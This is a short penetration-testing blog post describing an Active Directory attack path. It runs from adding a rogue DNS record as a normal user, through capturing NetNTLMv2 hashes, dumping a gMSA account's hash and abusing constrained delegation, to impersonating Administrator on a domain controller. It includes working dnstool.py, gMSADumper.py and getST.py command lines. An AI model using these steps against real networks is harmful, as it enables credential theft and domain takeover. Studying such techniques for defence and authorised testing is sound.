[back](/)

### Evil DNS zone and Constrained Delegation in Active Directory

Quite often during the attack on the Active Directory it turns out that the DNS server is used with default settings.

Thus, it is possible to add DNS entry with the rights of a regular domain user. The fact is that by default for the Authenticated Users group there are no restrictions on creating DNS records, such through access to LDAP.

![Image](/img/evil_dns/1.png)

```
python3 dnstool.py -u 'yourdomain.ru\Tiffany.Molina' -p password --action add -r web332211.domain.ru -d attacker-ip ldap-ip
```

![Image](/img/evil_dns/2.png)

![Image](/img/evil_dns/3.png)

After successfully adding a DNS entry associated with an IP attacker, you can get domain user netNTLM hash, that will access to the added DNS name fot example by smb or http with network netNTLM authentication. Moreover, this DNS record looks reliable, from the point of view of confidence in the resource. This can be used for targeted attacks.

So, after running Responder we get netNTLMV2 hash:

![Image](/img/evil_dns/4.png)

By collecting Active Directory dump and downloading it to the Bloodhound database, it became clear that the user Ted.Graves consists in the ITSupport group.

![Image](/img/evil_dns/5.png)

TED.graves can control the service account through the Group Managed Service Accounts functionality (GMSA), while having the ability to get password or NTLM belonging to SVC_INT user.

```
python3 gMSADumper.py -u username -p password -d domain.ru
```

![Image](/img/evil_dns/6.png)

SVC_INT user has the ability to request a service ticket and impersonate it for any user. Using in this case, the S4U2SELF/S4U2Proxy mechanism can be obtained by the privileges of the domain administrator.

![Image](/img/evil_dns/7.png)

```
getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password'  -hashes :NTLM-hash -impersonate Administrator
```

![Image](/img/evil_dns/8.png)

After receiving the service ticket and export it to the environment, you can use the wmiexec.py to get interactive access to domain controller


<div id="disqus_thread"></div>
<script>
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://hackitfaster-hopto-org.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

[back](/)